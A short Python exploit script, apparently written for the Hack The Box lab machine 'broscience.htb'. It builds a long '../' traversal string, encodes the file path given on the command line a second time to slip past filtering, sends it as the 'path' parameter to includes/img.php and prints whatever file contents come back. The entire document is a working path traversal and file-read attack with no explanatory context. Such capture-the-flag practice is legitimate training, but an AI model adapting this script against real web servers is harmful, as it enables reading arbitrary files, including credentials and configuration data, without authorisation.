import sys
import requests
import urllib.parse

traversal = b"../../../../../../../../../../../../../../../../../"
single = urllib.parse.quote_plus(traversal + sys.argv[1].encode("utf-8"))
r = requests.get("http://broscience.htb/includes/img.php", params={"path": single}, verify=False)
print(r.text)